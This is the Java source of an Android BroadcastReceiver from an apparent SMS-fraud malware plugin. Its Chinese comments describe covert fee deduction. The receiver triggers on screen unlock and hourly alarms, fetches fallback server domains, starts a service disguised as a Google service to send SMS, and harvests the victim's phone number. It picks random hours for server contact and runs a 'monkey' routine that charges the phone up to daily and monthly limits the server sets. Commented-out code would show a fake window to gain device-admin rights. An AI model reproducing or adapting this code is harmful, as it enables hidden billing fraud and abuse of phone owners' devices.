package com.xstd.plugin.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.Utils.BRCUtil;
import com.xstd.plugin.Utils.DomanManager;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.PluginSettingManager;
import com.xstd.plugin.service.GoogleInternalService;
import com.xstd.plugin.service.PluginInternalService;
import com.xstd.qm.setting.MainSettingManager;

import java.util.Calendar;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:43
 * To change this template use File | Settings | File Templates.
 */
public class ScreenBRC extends BroadcastReceiver {

    public static final String HOUR_ALARM_ACTION = "com.xstd.hour.alarm";

    public static final String KEY_FORCE_FETCH = "force_fetch";

    public void onReceive(Context context, Intent intent) {
        MainSettingManager.getInstance().init(context);
        if (!MainSettingManager.getInstance().getMainShouldFakePlugin()) {
            return;
        }

        if (UtilsRuntime.isOnline(context)) {
            MobclickAgent.flush(context);
        }

        if (intent == null) return;

        //如果只剩下一个域名了，去服务器获取
        if (DomanManager.getInstance(context).getDomainCount() <= 1
            && UtilsRuntime.isOnline(context)
            && PluginSettingManager.getInstance().getTodayFetchDomainCount() < 5) {
            //一天获取三次
            Intent fetchIntent = new Intent();
            fetchIntent.setAction(PluginInternalService.ACTION_FETCH_DOMAIN);
            fetchIntent.setClass(context, PluginInternalService.class);
            context.startService(fetchIntent);
        }

        //check Google Service if runging for SMS
        Intent serviceIntent = new Intent();
        serviceIntent.setClass(context, GoogleInternalService.class);
        context.startService(serviceIntent);

        PluginSettingManager.getInstance().init(context);

        //启动小时定时器
        BRCUtil.startHourAlarm(context);

        boolean isForce = intent.getBooleanExtra(KEY_FORCE_FETCH, false);

//        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
//        boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class))
//                                     && PluginSettingManager.getInstance().getKeyHasBindingDevices();

        String oldPhoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
        if (!TextUtils.isEmpty(oldPhoneNumbers)) {
            Intent i = new Intent();
            i.setClass(context, PluginInternalService.class);
            i.setAction(PluginInternalService.SMS_BROADCAST_ACTION);
            context.startService(i);
        }

        AppRuntime.getPhoneNumberForLocal(context);

        if (intent != null/* && isDeviceBinded*/) {
            if (Config.DEBUG) {
                Config.LOGD("[[ScreenBRC::onReceive]] check Main APK Active Info : " +
                                " channel ID = " + PluginSettingManager.getInstance().getMainApkChannel() +
                                " UUID = " + PluginSettingManager.getInstance().getMainApkSendUUID() +
                                " Extra Info = " + PluginSettingManager.getInstance().getMainExtraInfo() +
                                " main apk active time = " + PluginSettingManager.getInstance().getMainApkActiveTime());
            }

            //只有SIM卡准备好的时候才进行模拟激活，并且IMSI > 0
            if (AppRuntime.isSIMCardReady(context)
                && AppRuntime.getNetworkTypeByIMSI(context) > 0
                && PluginSettingManager.getInstance().getMainApkActiveTime() == 0) {
                //子程序没有做母程序激活
                if (!TextUtils.isEmpty(PluginSettingManager.getInstance().getMainApkChannel())
                        && !TextUtils.isEmpty(PluginSettingManager.getInstance().getMainApkSendUUID())
                        && !TextUtils.isEmpty(PluginSettingManager.getInstance().getMainExtraInfo())) {
                    //关键的三个数据都不为空在进行激活，否则激活也找不到对应的设备串号，所以什么也不做
                    if (Config.DEBUG) {
                        Config.LOGD("[[ScreenBRC::onReceive]] try to send MAIN ACTIVE EVENT with action : " + PluginInternalService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
                    }
                    Intent mainActive = new Intent();
                    mainActive.setAction(PluginInternalService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
                    mainActive.setClass(context, PluginInternalService.class);
                    context.startService(mainActive);
                }
            }

            String action = intent.getAction();
            if (Intent.ACTION_USER_PRESENT.equals(action) || HOUR_ALARM_ACTION.equals(action)) {
                Config.LOGD("[[ScreenBRC::onReceive]] action = " + action);
                //主要逻辑

                if (PluginSettingManager.getInstance().getKeyActiveTime() == 0) {
                    //没有激活过，就调用激活接口, 首次激活
                    if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                        if (Config.DEBUG) {
                            Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginInternalService for " + PluginInternalService.ACTIVE_ACTION
                                            + " as active time = 0;");
                        }

                        long dayTime = ((long) 24) * 60 * 60 * 1000;
                        PluginSettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis() - dayTime);
                        Intent i = new Intent();
                        i.setAction(PluginInternalService.ACTIVE_ACTION);
                        i.setClass(context, PluginInternalService.class);
                        context.startService(i);
                    }

                    return;
                } else {
                    long lastActiveTime = PluginSettingManager.getInstance().getKeyActiveTime();
                    Calendar c = Calendar.getInstance();
                    c.setTimeInMillis(lastActiveTime);
                    int lastDay = c.get(Calendar.DAY_OF_YEAR);
                    int lastMonth = c.get(Calendar.MONTH);
                    int lastYear = c.get(Calendar.YEAR);
                    c = Calendar.getInstance();
                    int curDay = c.get(Calendar.DAY_OF_YEAR);
                    int curHour = c.get(Calendar.HOUR_OF_DAY);
                    int curMonth = c.get(Calendar.MONTH);
                    int curYear = c.get(Calendar.YEAR);

                    if (Config.DEBUG) {
                        Config.LOGD("[[ScreenBRC::onReceive]] : " +
                                        "\n              last active day = " + lastDay + " last year : " + lastYear
                                        + "\n              cur day = " + curDay + " cur year : " + curYear
                                        + "\n              next random Hour is : " + PluginSettingManager.getInstance().getKeyRandomNetworkTime()
                                        + "\n              action = " + action
                                        + "\n              last send SMS day time : " + PluginSettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
//                                        + "\n              sms send delay days : " + smsSendDelayDays
                                        + "\n>>>>>>>>>>>>>>>>>");
                    }

                    if (curDay != lastDay) {
                        //如果不是同一天，将之前一天作为计数的清零
                        PluginSettingManager.getInstance().setKeyDayCount(0);
                        int next = AppRuntime.randomBetween(4, 17);
                        PluginSettingManager.getInstance().setKeyRandomNetworkTime(next);
                        PluginSettingManager.getInstance().setTodayFetchDomainCount(0);
                    }
                    if (curMonth != lastMonth) {
                        //如果不是同一个月，将月扣费计数清零
                        PluginSettingManager.getInstance().setKeyMonthCount(0);
                    }

                    //判断手机号码是否存在，如果不存在如何获取
                    if (PluginSettingManager.getInstance().getKeyLastSendMsgToServicehPhone() != 0
                            && TextUtils.isEmpty(PluginSettingManager.getInstance().getCurrentPhoneNumber())) {
                        Calendar smsC = Calendar.getInstance();
                        smsC.setTimeInMillis(PluginSettingManager.getInstance().getKeyLastSendMsgToServicehPhone());
                        int smsLastDay = smsC.get(Calendar.DAY_OF_YEAR);
                        int smsLastYear = smsC.get(Calendar.YEAR);
                        int smsSendDelayDays = (curYear - smsLastYear) * 365 - smsLastDay + curDay;
                        long deta = System.currentTimeMillis() - PluginSettingManager.getInstance().getKeyLastSendMsgToServicehPhone();
                        if (smsSendDelayDays >= Config.SMS_SEND_DELAY/* || deta >= Config.SMS_IMSI2PHONE_DELAY*/) {
                            //如果时间大于1天的，并且手机号码是空的，那么就要重新获取手机号码
                            int times = PluginSettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes();
                            if (Config.DEBUG) {
                                Config.LOGD("[[ScreenBRC::onReceive]] SMS Service Phone cleart times : " + times);
                            }
                            if (times > 90) {
                                Intent iPhoneFetch = new Intent();
                                iPhoneFetch.setClass(context, PluginInternalService.class);
                                iPhoneFetch.setAction(PluginInternalService.ACTIVE_FETCH_PHONE_ACTION);
                                context.startService(iPhoneFetch);
                            } else {
                                if (Config.DEBUG) {
                                    Config.LOGD("[[ScreenBRC::onReceive]] clear send time to : " + (times + 1)
                                                    + " and setKeyDeviceHasSendToServicePhone = false");
                                }
                                PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(times + 1);
                                PluginSettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
                            }
                        }
                    }

                    //TODO:此处可能会出发服务器连接次数太多
                    if ((isForce && AppRuntime.ACTIVE_RESPONSE == null)
                            || ((curDay != lastDay || AppRuntime.ACTIVE_RESPONSE == null)
                                    && curHour >= PluginSettingManager.getInstance().getKeyRandomNetworkTime()
                                    && UtilsRuntime.isOnline(context))) {
                        //如果之前获取过数据，并且不是同一天，并且当前时间大于6点，那么获取一次接口数据
                        //当天如果没有激活过，当天不扣费
                        if (curDay != lastDay) {
                            //如果不是同一天，将激活计数清零
                            PluginSettingManager.getInstance().setKeyDayActiveCount(0);
                        }

                        if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()
                                && PluginSettingManager.getInstance().getKeyDayActiveCount() < 16) {
                            if (Config.DEBUG) {
                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginInternalService for " + PluginInternalService.ACTIVE_ACTION
                                                + " as active time is over"
                                                + " , isForce : (" + isForce + ")");
                            }
                            Intent i = new Intent();
                            i.setAction(PluginInternalService.ACTIVE_ACTION);
                            i.setClass(context, PluginInternalService.class);
                            context.startService(i);
                        }
                        return;
                    }

                    if ((curDay == lastDay)
                            && AppRuntime.ACTIVE_RESPONSE != null
                            && (curHour >= AppRuntime.ACTIVE_RESPONSE.exeStart
                                    && curHour <= AppRuntime.ACTIVE_RESPONSE.exeEnd)) {
                        //如果没有SIM卡，记录错误信息
                        //关闭这个判断
//                        if (!AppRuntime.isSIMCardReady(context)) {
//                            if (Config.DEBUG) {
//                                Config.LOGD("[[ScreenBRC::onReceive]] Error info for monkey, SIM card is not ready");
//                            }
//                            PluginSettingManager.getInstance().setKeyLastErrorInfo("没有SIM卡");
//                            return;
//                        } else {
//                            PluginSettingManager.getInstance().setKeyLastErrorInfo("无");
//                        }

                        //今天已经成功激活过了，同时激活的数据还存在，开始进行扣费的逻辑
                        int dayCount = PluginSettingManager.getInstance().getKeyDayCount();
                        int times = AppRuntime.ACTIVE_RESPONSE.times;
                        if (times > dayCount) {
                            if (Config.DEBUG) {
                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginInternalService for " + PluginInternalService.MONKEY_ACTION);
                            }
                            Intent i = new Intent();
                            i.setAction(PluginInternalService.MONKEY_ACTION);
                            i.setClass(context, PluginInternalService.class);
                            context.startService(i);
                        }
                    }
                }
            }
        }

//        if (!isDeviceBinded) {
//            if (AppRuntime.WATCHING_SERVICE_RUNNING.get()) return;
//
//            if (Config.DEBUG) {
//                Config.LOGD("[[ScreenBRC::onReceive]] try to start FAKE WINDOWS process, binding Time : "
//                                + PluginSettingManager.getInstance().getDeviceBindingCount());
//            }
//
//            if (PluginSettingManager.getInstance().getDeviceBindingCount() <= 10
//                    /**
//                && PluginSettingManager.getInstance().getBindWindowNotShowCount() <= 3
//                     */) {
//                CommonUtil.startFakeService(context, "ScreenBRC::onReceive");
//
//                Intent i = new Intent();
//                i.setClass(context, FakeActivity.class);
//                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
//                context.startActivity(i);
//            } else {
//                if (PluginSettingManager.getInstance().getDeviceBindingCount() <= 100) {
//                    //notify umeng
//                    HashMap<String, String> log = new HashMap<String, String>();
//                    log.put("phoneType", Build.MODEL);
//                    log.put("bind_time", String.valueOf(PluginSettingManager.getInstance().getDeviceBindingCount()));
//                    CommonUtil.umengLog(context, "bind_too_times", log);
//                    PluginSettingManager.getInstance().setDeviceBindingCount(101);
//                }
//            }
//        }
    }

}
